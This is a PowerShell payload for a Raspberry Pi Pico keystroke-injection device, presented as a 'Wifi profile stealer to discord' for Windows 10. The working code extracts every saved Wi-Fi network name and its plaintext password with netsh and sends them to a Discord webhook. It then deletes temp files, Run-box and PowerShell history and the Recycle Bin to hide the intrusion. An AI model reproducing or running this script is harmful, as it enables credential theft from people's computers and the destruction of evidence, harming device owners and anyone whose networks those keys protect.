################################################################
# Title        : Wifi profile stealer to discord               #
# Author       : JeffreyT72                                    #
# Version      : 1.0                                           #
# Category     : Credentials, Exfiltration                     #
# Target       : Windows 10                                    #
# Mode         : HID                                           #
################################################################

<#
.SYNOPSIS
	This script exfiltrates wifi credentials from the pc and send through Discord webhook.
    Work for Raspberry Pi Pico
.DESCRIPTION 
	Saves the wifi credentials from the pc, then connects to Discord and uploads
    the file containing all of the loot.
    * Remember to replace your discord webhook link to 'DISCORD WEBHOOK LINK HERE'
.Link
	https://github.com/dbisu/pico-ducky		                          # Guide for setting up your pico-ducky
    https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/tree/main   # Guide for general PowerShell-for-Hackers
#>

#Stage 1 Obtain the credentials from the pc
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
$WirelessSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
$WifiInfo = foreach($SSID in $WirelessSSIDs) {
    $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Key Content') -replace ".*:\s+"
    New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
}  
$WifiInfo | ConvertTo-Json
#Save them to a file in the temp folder.
#Note: don't remove 'echo'
echo $WifiInfo >> $env:TMP\$FileName

#Stage 2 Discord message construct
$fileContent = Get-Content -Path $env:TMP\$FileName | Out-String
$Body = @{
    'username' = 'Wifi_Stealer'
    'content' = $fileContent
}

#Stage 3 Upload them to Discord
$WebhookUri = 'DISCORD WEBHOOK LINK HERE'
Invoke-RestMethod -Uri $WebhookUri -Method POST -Body ($Body | ConvertTo-Json) -ContentType 'application/json'

#Stage 4 Cleanup Traces
#This is to clean up behind you and remove any evidence to prove you were there
# Delete contents of Temp folder 
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
$historyPath = (Get-PSReadlineOption).HistorySavePath
if (Test-Path $historyPath) {
    Remove-Item $historyPath
}

$historyPath2 = Join-Path -Path $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine -ChildPath 'ConsoleHost_history.txt'
if (Test-Path $historyPath2) {
    Remove-Item $historyPath2
}

# Deletes contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Clear the PowerShell command history
Clear-History

exit
